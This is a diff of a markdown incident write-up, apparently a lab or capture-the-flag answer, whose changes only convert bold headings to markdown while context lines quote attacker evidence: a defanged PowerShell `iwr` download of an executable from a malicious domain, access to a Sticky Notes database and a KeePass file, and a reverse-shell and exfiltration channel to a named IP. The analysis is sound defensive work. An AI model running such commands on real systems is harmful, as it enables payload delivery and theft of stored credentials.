@@ -133,7 +133,7 @@ See explanation from Q7.
 The attacker's TTPs observed in the logs range from defense evasion to enumeration and data exfiltration. 
 
 
-<b><u>Execution & Defense Evasion</u></b>
+**Execution & Defense Evasion**
 
 The attacker uses native system tools and scripting capabilities to execute their payload.
 
@@ -148,7 +148,7 @@ Evidence: The use of `iwr` (`Invoke-WebRequest`) to download binaries from a rem
 `iwr hXXp://files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe`
 
 
-<b><u>Discovery</u></b> 
+**Discovery** 
 
 After gaining a foothold in the system, the attacker gathers information about the environment and its user data.
 
@@ -175,7 +175,7 @@ Evidence: The attacker also looks for and accesses a SQLite database file relate
 `ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite`
 
 
-<b><u>Collection</u></b> 
+**Collection** 
 
 The attacker gathers specific data identified during the discovery phase.
 
@@ -188,7 +188,7 @@ Evidence: The attacker reads the entire contents of the target file into memory,
 `$file='protected_data.kdbx'; ... $bytes = [System.IO.File]::ReadAllBytes($file);`
 
 
-<b><u>Command and Control (C2)</u></b> 
+**Command and Control (C2)**
 
 The attacker uses a custom C2 channel for communication and data transfer.
 
@@ -203,7 +203,7 @@ Evidence: The main PowerShell reverse shell connects to a domain and IP address,
 Evidence: The exfiltration channel communicates with a malicious domain (`bpakcaging[.]xyz`) and an attacker-controlled server (`167[.]71[.]211[.]113`).
 
 
-<b><u>Exfiltrated Data and Method</u></b>
+**Exfiltrated Data and Method**
 
 What Was Exfiltrated?
 
